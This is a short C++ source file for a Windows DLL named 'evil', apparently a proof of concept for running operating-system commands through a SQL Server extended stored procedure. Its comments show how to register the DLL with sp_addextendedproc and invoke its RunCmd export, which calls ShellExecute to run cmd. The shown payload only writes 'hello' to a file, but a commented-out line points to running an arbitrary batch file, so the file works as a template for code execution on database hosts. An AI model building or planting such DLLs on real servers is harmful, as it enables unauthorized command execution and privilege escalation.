// Reference: http://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extended-stored-procedure
// compile for 32 and 64 
// manual tests
// rundll32 evil32.dll,RunCmd
// rundll32 evil64.dll,RunCmd
// sp_addextendedproc 'RunCmd', 'c:\Temp\evil64.dll';
// RunCmd
//DllMain.cpp
#include "stdafx.h"			// dllmain.cpp : Defines the entry point for the DLL application.
#include "srv.h"			  //Must get from C:\Program Files (x86)\Microsoft SQL Server\80\Tools\DevTools\Include            
#include "shellapi.h"		//need for ShellExecute          
#include "string"			  //needed for std:string         
#include <sys/stat.h>		//need for stat in fileExists function below  

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

#define DLL_FUNC extern "C" __declspec (dllexport)          

DLL_FUNC int __stdcall RunCmd() {
	
	//ShellExecute(NULL, TEXT("open"), TEXT("C:\\Temp\\execute.bat"), NULL, NULL, SW_SHOWNORMAL);
	ShellExecute(NULL, TEXT("open"), TEXT("cmd"), TEXT(" /C echo hello > c:\\Temp\\evil.txt"), TEXT(" C:\ "), SW_SHOW);
	return 0;
}
